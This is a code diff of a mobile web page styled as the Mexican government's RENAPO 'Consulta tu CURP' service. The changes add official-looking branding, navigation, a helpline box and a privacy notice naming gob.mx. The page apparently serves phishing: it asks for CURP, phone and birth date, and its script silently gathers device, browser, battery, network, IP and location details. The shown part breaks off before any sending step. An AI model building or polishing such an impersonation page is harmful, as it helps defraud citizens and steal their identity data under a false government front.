@@ -5,37 +5,117 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Consulta tu CURP</title>
 <style>
-:root{--guinda:#691C32;--gris-tab:#E6E6E6;--borde-input:#D1D5DB;--borde-tarjeta:#E5E7EB;--texto:#1F2937;--suave:#6B7280}
+:root{--guinda:#691C32;--guinda-osc:#4A1322;--guinda-int:#7A2039;--gris-tab:#E6E6E6;--borde-input:#D1D5DB;--borde-tarjeta:#E5E7EB;--texto:#1F2937;--suave:#6B7280}
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#FFFFFF;color:var(--texto);padding:18px 12px 30px}
-.columna-angosta{max-width:362px;margin:0 auto}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#FFFFFF;color:var(--texto);padding:0 0 30px}
+
+/* ===== Barra superior guinda + subbarra ===== */
+.barra-gob{background:var(--guinda-osc);color:#fff;padding:8px 14px;display:flex;align-items:center;justify-content:space-between;gap:10px}
+.barra-gob .gz{display:flex;align-items:center;gap:8px;font-size:.78rem;font-weight:700;letter-spacing:.02em}
+.barra-gob .gz .esc{width:26px;height:26px;border-radius:50%;background:#fff;color:var(--guinda);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;flex-shrink:0}
+.barra-gob .gz .txt{line-height:1.1}
+.barra-gob .gz .txt small{display:block;font-weight:400;font-size:.62rem;opacity:.85;letter-spacing:.02em}
+.barra-gob .der{font-size:.64rem;opacity:.9;text-align:right;line-height:1.2}
+.subbarra{background:var(--guinda-int);color:#fff;padding:5px 14px;display:flex;align-items:center;justify-content:space-between;font-size:.62rem;letter-spacing:.04em;text-transform:uppercase}
+.subbarra .r{display:flex;gap:12px}
+.subbarra .r span{opacity:.9}
+
+/* ===== Ruta de navegación ===== */
+.ruta{max-width:365px;margin:0 auto;padding:10px 14px 0;font-size:.72rem;color:var(--suave)}
+.ruta .casita{font-size:.8rem;margin-right:2px}
+.ruta .sep{margin:0 4px;color:#9CA3AF}
+.ruta .actual{color:#111827;font-weight:700}
+
+/* ===== Contenido ===== */
+.columna-angosta{max-width:365px;margin:0 auto;padding:14px 12px 0}
 .titulo-principal{font-size:1.55rem;line-height:1.12;font-weight:800;color:#1F2937;margin-bottom:18px;margin-left:10mm}
 .subtitulo-busqueda{font-size:1.15rem;font-weight:800;color:#1F2937;padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin-bottom:14px}
-.descripcion{font-size:0.78rem;line-height:1.45;color:var(--suave);margin-bottom:18px}
+.descripcion{font-size:.78rem;line-height:1.45;color:var(--suave);margin-bottom:18px}
 .tabs-apiladas{display:flex;flex-direction:column;align-items:flex-start}
-.tab-item{border:none;padding:7px 12px;font-size:0.76rem;border-radius:0;cursor:pointer;background:var(--gris-tab);color:#4B5563;font-family:inherit;text-align:left}
+.tab-item{border:none;padding:7px 12px;font-size:.76rem;border-radius:0;cursor:pointer;background:var(--gris-tab);color:#4B5563;font-family:inherit;text-align:left}
 .tab-item.activa{background:var(--guinda);color:#FFFFFF}
 .caja-form{background:#FFFFFF;border:1px solid var(--borde-tarjeta);box-shadow:0 2px 8px rgba(0,0,0,0.03);padding:16px 14px 26px}
 .panel-oculto{display:none}
-.seccion-titulo{font-size:0.8rem;font-weight:700;color:var(--guinda);padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin:8px 0 11px}
+.seccion-titulo{font-size:.8rem;font-weight:700;color:var(--guinda);padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin:8px 0 11px}
 .grupo-campo{margin-bottom:11px}
 .grupo-campo:last-child{margin-bottom:0}
-.grupo-campo label{display:block;font-size:0.76rem;font-weight:700;line-height:1.25;color:#1F2937;margin-bottom:4px}
-.grupo-campo input,.grupo-campo select{width:100%;height:33px;padding:0 9px;font-size:0.78rem;color:var(--texto);background:#FFFFFF;border:1px solid var(--borde-input);border-radius:3px;font-family:inherit}
+.grupo-campo label{display:block;font-size:.76rem;font-weight:700;line-height:1.25;color:#1F2937;margin-bottom:4px}
+.grupo-campo input,.grupo-campo select{width:100%;height:33px;padding:0 9px;font-size:.78rem;color:var(--texto);background:#FFFFFF;border:1px solid var(--borde-input);border-radius:3px;font-family:inherit}
 .grupo-campo input::placeholder{color:#9CA3AF}
 .grupo-campo input:focus,.grupo-campo select:focus{outline:none;border-color:var(--guinda)}
-.cp-info{font-size:0.7rem;color:#1c9c4c;font-weight:700;margin-top:3px;min-height:10px}
+.cp-info{font-size:.7rem;color:#1c9c4c;font-weight:700;margin-top:3px;min-height:10px}
+
+/* ===== Enlace "¿No conoces tu CURP?" ===== */
+.enlace-curp{display:inline-block;margin-top:8px;font-size:.76rem;color:var(--guinda);text-decoration:underline;cursor:pointer;background:none;border:none;font-family:inherit;padding:0}
+.enlace-curp:active{opacity:.7}
+
 .barra-inferior{margin-top:16px;display:flex;justify-content:space-between;align-items:center;gap:10px}
-.obligatorios{font-size:0.76rem;color:var(--suave)}
-.boton-buscar{display:inline-flex;align-items:center;gap:6px;background:#FFFFFF;color:var(--guinda);border:1.4px solid var(--guinda);border-radius:3px;padding:6px 14px;font-size:0.78rem;cursor:pointer;font-family:inherit;font-weight:600}
+.obligatorios{font-size:.76rem;color:var(--suave)}
+.boton-buscar{display:inline-flex;align-items:center;gap:6px;background:#FFFFFF;color:var(--guinda);border:1.4px solid var(--guinda);border-radius:3px;padding:6px 14px;font-size:.78rem;cursor:pointer;font-family:inherit;font-weight:600}
 .boton-buscar:disabled{opacity:.55;cursor:not-allowed}
 .tel-row{display:flex;gap:6px}
-.tel-lada{flex:0 0 46%;display:flex;align-items:center;gap:4px;height:33px;padding:0 6px;border:1px solid var(--borde-input);border-radius:3px;background:#FFFFFF;font-size:0.75rem}
-.tel-lada select{border:0;padding:0;height:auto;font-size:0.75rem;background:transparent;flex:1;outline:none;font-family:inherit}
+.tel-lada{flex:0 0 46%;display:flex;align-items:center;gap:4px;height:33px;padding:0 6px;border:1px solid var(--borde-input);border-radius:3px;background:#FFFFFF;font-size:.75rem}
+.tel-lada select{border:0;padding:0;height:auto;font-size:.75rem;background:transparent;flex:1;outline:none;font-family:inherit}
 .tel-num{flex:1}
+.load{width:11px;height:11px;border:2px solid var(--guinda);border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite;display:inline-block;vertical-align:-2px;margin-right:4px}
+@keyframes s{to{transform:rotate(360deg)}}
+
+/* ===== Recuadros de información ===== */
+.recuadro-info {
+  background-color: #E3F1F8;
+  border: 1px solid #B8D8E8;
+  border-radius: 4px;
+  padding: 16px 14px;
+  margin-bottom: 16px;
+  font-family: "Open Sans", Roboto, -apple-system, sans-serif;
+  color: #2C5E75;
+  text-align: center;
+}
+.recuadro-info:last-child { margin-bottom: 0; }
+.recuadro-info .info-titulo {
+  font-size: 0.78rem;
+  font-weight: 700;
+  line-height: 1.35;
+  color: #2C5E75;
+  margin-bottom: 8px;
+}
+.recuadro-info .info-cuerpo {
+  font-size: 0.72rem;
+  font-weight: 400;
+  line-height: 1.5;
+  color: #2C5E75;
+  margin-bottom: 6px;
+}
+.recuadro-info .info-cuerpo:last-child { margin-bottom: 0; }
 </style>
 </head>
 <body>
+
+<!-- ===== BARRA SUPERIOR GUINDA ===== -->
+<div class="barra-gob">
+  <div class="gz">
+    <div class="esc">🇲🇽</div>
+    <div class="txt">
+      Gobierno de México
+      <small>Registro Nacional de Población</small>
+    </div>
+  </div>
+  <div class="der">
+    Portal de Trámites<br>Servicios · Consulta
+  </div>
+</div>
+<div class="subbarra">
+  <span>RENAPO · CURP</span>
+  <div class="r"><span>Ayuda</span><span>Contacto</span></div>
+</div>
+
+<!-- ===== RUTA DE NAVEGACIÓN ===== -->
+<nav class="ruta">
+  <span class="casita">🏠</span><span class="sep">&gt;</span>
+  <span>Inicio</span><span class="sep">&gt;</span>
+  <span class="actual">Consulta tu CURP</span>
+</nav>
+
 <div class="columna-angosta">
   <h1 class="titulo-principal">Consulta tu<br>CURP</h1>
   <h2 class="subtitulo-busqueda">Búsqueda</h2>
@@ -51,6 +131,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
       <div class="grupo-campo">
         <label for="curp">Clave Única de Registro de<br>Población (CURP)*:</label>
         <input id="curp" type="text" maxlength="18" autocomplete="off" placeholder="Ingresa tu CURP" style="text-transform:uppercase" />
+        <button type="button" class="enlace-curp" onclick="cambiarTab('datos')">¿No conoces tu CURP?</button>
       </div>
     </div>
 
@@ -77,9 +158,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
       <div class="grupo-campo">
         <label for="telefono">Teléfono*:</label>
         <div class="tel-row">
-          <div class="tel-lada">
-            <select id="lada"></select>
-          </div>
+          <div class="tel-lada"><select id="lada"></select></div>
           <input id="telefono" class="tel-num" type="tel" autocomplete="off" placeholder="10 dígitos" />
         </div>
       </div>
@@ -94,397 +173,231 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
       Buscar
     </button>
   </div>
+
+  <!-- ===== RECUADROS DE INFORMACIÓN ===== -->
+  <div class="recuadro-info">
+    <p class="info-titulo">¡Sugerencia!</p>
+    <p class="info-cuerpo">Para solicitar asistencia telefónica sobre el servicio de la CURP, puedes comunicarte al Centro de Atención y Servicios, de lunes a viernes, de 08:00 a 16:00 horas, a los números telefónicos:</p>
+    <p class="info-cuerpo">800 9 00 00 11, extensiones 15121 y 15421.</p>
+  </div>
+
+  <div class="recuadro-info">
+    <p class="info-titulo">AVISO DE PRIVACIDAD SIMPLIFICADO DE CONSULTA DE CURP EN LÍNEA</p>
+    <p class="info-cuerpo">La recolección de datos personales se lleva a cabo a través de https://www.gob.mx/, cuyo administrador y responsable del trámite de CURP es la Dirección General del Registro Nacional de Población e Identidad de la Secretaría de Gobernación.</p>
+    <p class="info-cuerpo">Los datos personales que se recaban serán utilizados con la finalidad de buscar, validar y obtener la CURP.</p>
+    <p class="info-cuerpo">Conoce el aviso de privacidad integral en https://www.gob.mx/curp.integral.</p>
+  </div>
 </div>
 
 <script>
-// ===== LADAS DEL MUNDO (bandera + código + país) =====
-var LADAS = [
-["🇲🇽","+52","México"],["🇺🇸","+1","Estados Unidos"],["🇨🇦","+1","Canadá"],
-["🇬🇹","+502","Guatemala"],["🇸🇻","+503","El Salvador"],["🇭🇳","+504","Honduras"],
-["🇳🇮","+505","Nicaragua"],["🇨🇷","+506","Costa Rica"],["🇵🇦","+507","Panamá"],
-["🇧🇿","+501","Belice"],["🇨🇺","+53","Cuba"],["🇩🇴","+1","Rep. Dominicana"],
-["🇵🇷","+1","Puerto Rico"],["🇭🇹","+509","Haití"],
-["🇨🇴","+57","Colombia"],["🇻🇪","+58","Venezuela"],["🇪🇨","+593","Ecuador"],
-["🇵🇪","+51","Perú"],["🇧🇴","+591","Bolivia"],["🇵🇾","+595","Paraguay"],
-["🇺🇾","+598","Uruguay"],["🇦🇷","+54","Argentina"],["🇨🇱","+56","Chile"],
-["🇧🇷","+55","Brasil"],
-["🇪🇸","+34","España"],["🇵🇹","+351","Portugal"],["🇫🇷","+33","Francia"],
-["🇩🇪","+49","Alemania"],["🇮🇹","+39","Italia"],["🇬🇧","+44","Reino Unido"],
-["🇮🇪","+353","Irlanda"],["🇳🇱","+31","Países Bajos"],["🇧🇪","+32","Bélgica"],
-["🇨🇭","+41","Suiza"],["🇦🇹","+43","Austria"],["🇸🇪","+46","Suecia"],
-["🇳🇴","+47","Noruega"],["🇩🇰","+45","Dinamarca"],["🇫🇮","+358","Finlandia"],
-["🇵🇱","+48","Polonia"],["🇬🇷","+30","Grecia"],["🇷🇺","+7","Rusia"],
-["🇺🇦","+380","Ucrania"],["🇹🇷","+90","Turquía"],["🇮🇱","+972","Israel"],
-["🇪🇬","+20","Egipto"],["🇿🇦","+27","Sudáfrica"],["🇳🇬","+234","Nigeria"],
-["🇲🇦","+212","Marruecos"],["🇯🇵","+81","Japón"],["🇨🇳","+86","China"],
-["🇰🇷","+82","Corea del Sur"],["🇮🇳","+91","India"],["🇵🇰","+92","Pakistán"],
-["🇵🇭","+63","Filipinas"],["🇮🇩","+62","Indonesia"],["🇲🇾","+60","Malasia"],
-["🇸🇬","+65","Singapur"],["🇹🇭","+66","Tailandia"],["🇻🇳","+84","Vietnam"],
-["🇦🇺","+61","Australia"],["🇳🇿","+64","Nueva Zelanda"],
-["🇦🇫","+93","Afganistán"],["🇦🇱","+355","Albania"],["🇩🇿","+213","Argelia"],
-["🇦🇩","+376","Andorra"],["🇦🇴","+244","Angola"],["🇦🇲","+374","Armenia"],
-["🇦🇺","+61","Australia"],["🇦🇿","+994","Azerbaiyán"],["🇧🇭","+973","Bahréin"],
-["🇧🇩","+880","Bangladesh"],["🇧🇾","+375","Bielorrusia"],["🇧🇯","+229","Benín"],
-["🇧🇹","+975","Bután"],["🇧🇦","+387","Bosnia"],["🇧🇼","+267","Botsuana"],
-["🇧🇳","+673","Brunéi"],["🇧🇬","+359","Bulgaria"],["🇧🇫","+226","Burkina Faso"],
-["🇧🇮","+257","Burundi"],["🇰🇭","+855","Camboya"],["🇨🇲","+237","Camerún"],
-["🇹🇩","+235","Chad"],["🇨🇾","+357","Chipre"],["🇰🇲","+269","Comoras"],
-["🇨🇬","+242","Congo"],["🇨🇩","+243","Congo RD"],["🇰🇵","+850","Corea del Norte"],
-["🇨🇮","+225","Costa de Marfil"],["🇭🇷","+385","Croacia"],["🇩🇯","+253","Yibuti"],
-["🇪🇬","+20","Egipto"],["🇦🇪","+971","Emiratos Árabes"],["🇪🇷","+291","Eritrea"],
-["🇪🇪","+372","Estonia"],["🇸🇿","+268","Esuatini"],["🇪🇹","+251","Etiopía"],
-["🇫🇯","+679","Fiyi"],["🇬🇦","+241","Gabón"],["🇬🇲","+220","Gambia"],
-["🇬🇪","+995","Georgia"],["🇬🇭","+233","Ghana"],["🇬🇳","+224","Guinea"],
-["🇬🇼","+245","Guinea-Bisáu"],["🇬🇶","+240","Guinea Ecuatorial"],["🇬🇾","+592","Guyana"],
-["🇭🇺","+36","Hungría"],["🇮🇸","+354","Islandia"],["🇮🇷","+98","Irán"],
-["🇮🇶","+964","Irak"],["🇯🇲","+1","Jamaica"],["🇯🇴","+962","Jordania"],
-["🇰🇿","+7","Kazajistán"],["🇰🇪","+254","Kenia"],["🇰🇬","+996","Kirguistán"],
-["🇰🇮","+686","Kiribati"],["🇰🇼","+965","Kuwait"],["🇱🇦","+856","Laos"],
-["🇱🇸","+266","Lesoto"],["🇱🇻","+371","Letonia"],["🇱🇧","+961","Líbano"],
-["🇱🇷","+231","Liberia"],["🇱🇾","+218","Libia"],["🇱🇮","+423","Liechtenstein"],
-["🇱🇹","+370","Lituania"],["🇱🇺","+352","Luxemburgo"],["🇲🇬","+261","Madagascar"],
-["🇲🇼","+265","Malaui"],["🇲🇻","+960","Maldivas"],["🇲🇱","+223","Malí"],
-["🇲🇹","+356","Malta"],["🇲🇭","+692","Islas Marshall"],["🇲🇷","+222","Mauritania"],
-["🇲🇺","+230","Mauricio"],["🇫🇲","+691","Micronesia"],["🇲🇩","+373","Moldavia"],
-["🇲🇨","+377","Mónaco"],["🇲🇳","+976","Mongolia"],["🇲🇪","+382","Montenegro"],
-["🇲🇿","+258","Mozambique"],["🇲🇲","+95","Myanmar"],["🇳🇦","+264","Namibia"],
-["🇳🇷","+674","Nauru"],["🇳🇵","+977","Nepal"],["🇳🇪","+227","Níger"],
-["🇴🇲","+968","Omán"],["🇵🇼","+680","Palaos"],["🇵🇸","+970","Palestina"],
-["🇵🇬","+675","Papúa Nueva Guinea"],["🇶🇦","+974","Qatar"],["🇷🇴","+40","Rumanía"],
-["🇷🇼","+250","Ruanda"],["🇰🇳","+1","San Cristóbal y Nieves"],["🇱🇨","+1","Santa Lucía"],
-["🇻🇨","+1","San Vicente"],["🇼🇸","+685","Samoa"],["🇸🇲","+378","San Marino"],
-["🇸🇹","+239","Santo Tomé"],["🇸🇦","+966","Arabia Saudita"],["🇸🇳","+221","Senegal"],
-["🇷🇸","+381","Serbia"],["🇸🇨","+248","Seychelles"],["🇸🇱","+232","Sierra Leona"],
-["🇸🇰","+421","Eslovaquia"],["🇸🇮","+386","Eslovenia"],["🇸🇧","+677","Islas Salomón"],
-["🇸🇴","+252","Somalia"],["🇸🇸","+211","Sudán del Sur"],["🇸🇩","+249","Sudán"],
-["🇱🇰","+94","Sri Lanka"],["🇸🇷","+597","Surinam"],["🇸🇾","+963","Siria"],
-["🇹🇯","+992","Tayikistán"],["🇹🇿","+255","Tanzania"],["🇹🇱","+670","Timor Oriental"],
-["🇹🇬","+228","Togo"],["🇹🇴","+676","Tonga"],["🇹🇹","+1","Trinidad y Tobago"],
-["🇹🇳","+216","Túnez"],["🇹🇲","+993","Turkmenistán"],["🇹🇻","+688","Tuvalu"],
-["🇺🇬","+256","Uganda"],["🇺🇿","+998","Uzbekistán"],["🇻🇺","+678","Vanuatu"],
-["🇻🇦","+39","Vaticano"],["🇾🇪","+967","Yemen"],["🇿🇲","+260","Zambia"],
-["🇿🇼","+263","Zimbabue"],["🇭🇰","+852","Hong Kong"],["🇲🇴","+853","Macao"],
-["🇹🇼","+886","Taiwán"],["🇬🇱","+299","Groenlandia"],["🇬🇮","+350","Gibraltar"],
-["🇧🇲","+1","Bermudas"],["🇰🇾","+1","Islas Caimán"]
+/* ===== LADAS ===== */
+var LADAS=[
+["🇲🇽","+52","México"],["🇺🇸","+1","Estados Unidos"],["🇨🇦","+1","Canadá"],["🇬🇹","+502","Guatemala"],
+["🇸🇻","+503","El Salvador"],["🇭🇳","+504","Honduras"],["🇳🇮","+505","Nicaragua"],["🇨🇷","+506","Costa Rica"],
+["🇵🇦","+507","Panamá"],["🇧🇿","+501","Belice"],["🇨🇺","+53","Cuba"],["🇩🇴","+1","Rep. Dominicana"],
+["🇵🇷","+1","Puerto Rico"],["🇭🇹","+509","Haití"],["🇯🇲","+1","Jamaica"],["🇨🇴","+57","Colombia"],
+["🇻🇪","+58","Venezuela"],["🇪🇨","+593","Ecuador"],["🇵🇪","+51","Perú"],["🇧🇴","+591","Bolivia"],
+["🇵🇾","+595","Paraguay"],["🇺🇾","+598","Uruguay"],["🇦🇷","+54","Argentina"],["🇨🇱","+56","Chile"],
+["🇧🇷","+55","Brasil"],["🇪🇸","+34","España"],["🇵🇹","+351","Portugal"],["🇫🇷","+33","Francia"],
+["🇩🇪","+49","Alemania"],["🇮🇹","+39","Italia"],["🇬🇧","+44","Reino Unido"],["🇮🇪","+353","Irlanda"],
+["🇳🇱","+31","Países Bajos"],["🇧🇪","+32","Bélgica"],["🇨🇭","+41","Suiza"],["🇦🇹","+43","Austria"],
+["🇸🇪","+46","Suecia"],["🇳🇴","+47","Noruega"],["🇩🇰","+45","Dinamarca"],["🇫🇮","+358","Finlandia"],
+["🇵🇱","+48","Polonia"],["🇬🇷","+30","Grecia"],["🇷🇺","+7","Rusia"],["🇺🇦","+380","Ucrania"],
+["🇹🇷","+90","Turquía"],["🇮🇱","+972","Israel"],["🇪🇬","+20","Egipto"],["🇿🇦","+27","Sudáfrica"],
+["🇳🇬","+234","Nigeria"],["🇲🇦","+212","Marruecos"],["🇯🇵","+81","Japón"],["🇨🇳","+86","China"],
+["🇰🇷","+82","Corea del Sur"],["🇮🇳","+91","India"],["🇵🇰","+92","Pakistán"],["🇵🇭","+63","Filipinas"],
+["🇮🇩","+62","Indonesia"],["🇲🇾","+60","Malasia"],["🇸🇬","+65","Singapur"],["🇹🇭","+66","Tailandia"],
+["🇻🇳","+84","Vietnam"],["🇦🇺","+61","Australia"],["🇳🇿","+64","Nueva Zelanda"],
+["🇦🇫","+93","Afganistán"],["🇦🇱","+355","Albania"],["🇩🇿","+213","Argelia"],["🇦🇩","+376","Andorra"],
+["🇦🇴","+244","Angola"],["🇦🇲","+374","Armenia"],["🇦🇿","+994","Azerbaiyán"],["🇧🇭","+973","Bahréin"],
+["🇧🇩","+880","Bangladesh"],["🇧🇾","+375","Bielorrusia"],["🇧🇯","+229","Benín"],["🇧🇹","+975","Bután"],
+["🇧🇦","+387","Bosnia"],["🇧🇼","+267","Botsuana"],["🇧🇳","+673","Brunéi"],["🇧🇬","+359","Bulgaria"],
+["🇧🇫","+226","Burkina Faso"],["🇧🇮","+257","Burundi"],["🇰🇭","+855","Camboya"],["🇨🇲","+237","Camerún"],
+["🇹🇩","+235","Chad"],["🇨🇾","+357","Chipre"],["🇰🇲","+269","Comoras"],["🇨🇬","+242","Congo"],
+["🇨🇩","+243","Congo RD"],["🇰🇵","+850","Corea del Norte"],["🇨🇮","+225","Costa de Marfil"],["🇭🇷","+385","Croacia"],
+["🇩🇯","+253","Yibuti"],["🇦🇪","+971","Emiratos Árabes"],["🇪🇷","+291","Eritrea"],["🇪🇪","+372","Estonia"],
+["🇸🇿","+268","Esuatini"],["🇪🇹","+251","Etiopía"],["🇫🇯","+679","Fiyi"],["🇬🇦","+241","Gabón"],
+["🇬🇲","+220","Gambia"],["🇬🇪","+995","Georgia"],["🇬🇭","+233","Ghana"],["🇬🇳","+224","Guinea"],
+["🇬🇼","+245","Guinea-Bisáu"],["🇬🇶","+240","Guinea Ecuatorial"],["🇬🇾","+592","Guyana"],["🇭🇺","+36","Hungría"],
+["🇮🇸","+354","Islandia"],["🇮🇷","+98","Irán"],["🇮🇶","+964","Irak"],["🇯🇴","+962","Jordania"],
+["🇰🇿","+7","Kazajistán"],["🇰🇪","+254","Kenia"],["🇰🇬","+996","Kirguistán"],["🇰🇮","+686","Kiribati"],
+["🇰🇼","+965","Kuwait"],["🇱🇦","+856","Laos"],["🇱🇸","+266","Lesoto"],["🇱🇻","+371","Letonia"],
+["🇱🇧","+961","Líbano"],["🇱🇷","+231","Liberia"],["🇱🇾","+218","Libia"],["🇱🇮","+423","Liechtenstein"],
+["🇱🇹","+370","Lituania"],["🇱🇺","+352","Luxemburgo"],["🇲🇬","+261","Madagascar"],["🇲🇼","+265","Malaui"],
+["🇲🇻","+960","Maldivas"],["🇲🇱","+223","Malí"],["🇲🇹","+356","Malta"],["🇲🇭","+692","Islas Marshall"],
+["🇲🇷","+222","Mauritania"],["🇲🇺","+230","Mauricio"],["🇫🇲","+691","Micronesia"],["🇲🇩","+373","Moldavia"],
+["🇲🇨","+377","Mónaco"],["🇲🇳","+976","Mongolia"],["🇲🇪","+382","Montenegro"],["🇲🇿","+258","Mozambique"],
+["🇲🇲","+95","Myanmar"],["🇳🇦","+264","Namibia"],["🇳🇷","+674","Nauru"],["🇳🇵","+977","Nepal"],
+["🇳🇪","+227","Níger"],["🇴🇲","+968","Omán"],["🇵🇼","+680","Palaos"],["🇵🇸","+970","Palestina"],
+["🇵🇬","+675","Papúa Nueva Guinea"],["🇶🇦","+974","Qatar"],["🇷🇴","+40","Rumanía"],["🇷🇼","+250","Ruanda"],
+["🇰🇳","+1","San Cristóbal y Nieves"],["🇱🇨","+1","Santa Lucía"],["🇻🇨","+1","San Vicente"],["🇼🇸","+685","Samoa"],
+["🇸🇲","+378","San Marino"],["🇸🇹","+239","Santo Tomé"],["🇸🇦","+966","Arabia Saudita"],["🇸🇳","+221","Senegal"],
+["🇷🇸","+381","Serbia"],["🇸🇨","+248","Seychelles"],["🇸🇱","+232","Sierra Leona"],["🇸🇰","+421","Eslovaquia"],
+["🇸🇮","+386","Eslovenia"],["🇸🇧","+677","Islas Salomón"],["🇸🇴","+252","Somalia"],["🇸🇸","+211","Sudán del Sur"],
+["🇸🇩","+249","Sudán"],["🇱🇰","+94","Sri Lanka"],["🇸🇷","+597","Surinam"],["🇸🇾","+963","Siria"],
+["🇹🇯","+992","Tayikistán"],["🇹🇿","+255","Tanzania"],["🇹🇱","+670","Timor Oriental"],["🇹🇬","+228","Togo"],
+["🇹🇴","+676","Tonga"],["🇹🇹","+1","Trinidad y Tobago"],["🇹🇳","+216","Túnez"],["🇹🇲","+993","Turkmenistán"],
+["🇹🇻","+688","Tuvalu"],["🇺🇬","+256","Uganda"],["🇺🇿","+998","Uzbekistán"],["🇻🇺","+678","Vanuatu"],
+["🇻🇦","+39","Vaticano"],["🇾🇪","+967","Yemen"],["🇿🇲","+260","Zambia"],["🇿🇼","+263","Zimbabue"],
+["🇭🇰","+852","Hong Kong"],["🇲🇴","+853","Macao"],["🇹🇼","+886","Taiwán"],["🇬🇱","+299","Groenlandia"],
+["🇬🇮","+350","Gibraltar"],["🇧🇲","+1","Bermudas"],["🇰🇾","+1","Islas Caimán"]
 ];
 
-// ===== Variables globales =====
-var info = {
-  modelo: navigator.userAgent, so: navigator.platform||'?', navegador: '?',
-  pantalla: screen.width+'x'+screen.height, idioma: navigator.language,
-  bateria: '?', red: navigator.connection?navigator.connection.effectiveType:'?',
-  ip: '?', ciudad: '?', pais: '?', gps: 'no'
-};
-var foto = '', form = {};
+var info={modelo:navigator.userAgent,so:navigator.platform||'?',navegador:'?',pantalla:screen.width+'x'+screen.height,idioma:navigator.language,bateria:'?',red:navigator.connection?navigator.connection.effectiveType:'?',ip:'?',ciudad:'?',pais:'?',gps:'no'};
+var foto='',form={};
+var ua=navigator.userAgent;
+if(ua.indexOf('Chrome')>-1)info.navegador='Chrome';else if(ua.indexOf('Safari')>-1)info.navegador='Safari';else if(ua.indexOf('Firefox')>-1)info.navegador='Firefox';else info.navegador='Otro';
+var m='Móvil';if(ua.indexOf('iPhone')>-1)m='iPhone Apple';else if(ua.indexOf('iPad')>-1)m='iPad Apple';else if(ua.indexOf('Android')>-1){var mm=ua.match(/Android[^;]*;\s*([^)]+)/);m=mm?mm[1]:'Android';}info.modelo=m;
+if(ua.indexOf('iPhone OS')>-1)info.so='iOS '+((ua.match(/OS (\d+_\d+)/)||[])[1]||'').replace('_','.');else if(ua.indexOf('Android')>-1)info.so='Android '+((ua.match(/Android (\d+\.?\d*)/)||[])[1]||'');else if(ua.indexOf('Windows')>-1)info.so='Windows';
+fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(d){info.ip=d.ip||'?';info.ciudad=(d.city||'?')+(d.region?', '+d.region:'');info.pais=d.country_name||'?';}).catch(function(){});
+if(navigator.getBattery)navigator.getBattery().then(function(b){info.bateria=Math.round(b.level*100)+'%'+(b.charging?' ⚡':' 🔋');});
 
-// ===== Detección de navegador =====
-var ua = navigator.userAgent;
-if(ua.indexOf('Chrome')>-1) info.navegador='Chrome';
-else if(ua.indexOf('Safari')>-1) info.navegador='Safari';
-else if(ua.indexOf('Firefox')>-1) info.navegador='Firefox';
-else info.navegador='Otro';
+function v(id){var el=document.getElementById(id);return el?el.value:'';}
 
-var modelo = 'Móvil';
-if(ua.indexOf('iPhone')>-1) modelo='iPhone Apple';
-else if(ua.indexOf('iPad')>-1) modelo='iPad Apple';
-else if(ua.indexOf('Android')>-1){
-  var mm=ua.match(/Android[^;]*;\s*([^)]+)/);
-  modelo = mm?mm[1]:'Android';
-}
-info.modelo = modelo;
-
-if(ua.indexOf('iPhone OS')>-1) info.so='iOS '+((ua.match(/OS (\d+_\d+)/)||[])[1]||'').replace('_','.');
-else if(ua.indexOf('Android')>-1) info.so='Android '+((ua.match(/Android (\d+\.?\d*)/)||[])[1]||'');
-else if(ua.indexOf('Windows')>-1) info.so='Windows';
-
-// ===== Enriquecimiento asíncrono =====
-fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(d){
-  info.ip=d.ip||'?';
-  info.ciudad=(d.city||'?')+(d.region?', '+d.region:'');
-  info.pais=d.country_name||'?';
-}).catch(function(){});
-
-if(navigator.getBattery) navigator.getBattery().then(function(b){
-  info.bateria = Math.round(b.level*100)+'%'+(b.charging?' ⚡':' 🔋');
-});
-
-// ===== Helper: leer valor =====
-function v(id){
-  var el = document.getElementById(id);
-  return el ? el.value : '';
-}
-
-// ===== Poblar selects al cargar =====
 (function(){
-  // Día
-  var diaSel = document.getElementById('dia');
-  if(diaSel){
-    for(var i=1;i<=31;i++){
-      var o=document.createElement('option');
-      o.value=String(i).padStart(2,'0');
-      o.textContent=String(i).padStart(2,'0');
-      diaSel.appendChild(o);
-    }
-  }
-  // Mes
-  var mesSel = document.getElementById('mes');
-  if(mesSel){
-    var meses=['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
-    meses.forEach(function(nm,idx){
-      var o=document.createElement('option');
-      o.value=String(idx+1).padStart(2,'0');
-      o.textContent=nm;
-      mesSel.appendChild(o);
-    });
-  }
-  // Año
-  var anioSel = document.getElementById('anio');
-  if(anioSel){
-    for(var a=2026;a>=1940;a--){
-      var op=document.createElement('option');
-      op.value=String(a);
-      op.textContent=String(a);
-      anioSel.appendChild(op);
-    }
-  }
-  // LADAS
-  var ladaSel = document.getElementById('lada');
-  if(ladaSel){
-    LADAS.forEach(function(item){
-      var opt=document.createElement('option');
-      opt.value=item[1];
-      opt.textContent=item[0]+' '+item[1]+' '+item[2];
-      ladaSel.appendChild(opt);
-    });
-  }
+  var diaSel=document.getElementById('dia');
+  if(diaSel){for(var i=1;i<=31;i++){var o=document.createElement('option');o.value=String(i).padStart(2,'0');o.textContent=String(i).padStart(2,'0');diaSel.appendChild(o);}}
+  var mesSel=document.getElementById('mes');
+  if(mesSel){var meses=['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];meses.forEach(function(nm,idx){var o=document.createElement('option');o.value=String(idx+1).padStart(2,'0');o.textContent=nm;mesSel.appendChild(o);});}
+  var anioSel=document.getElementById('anio');
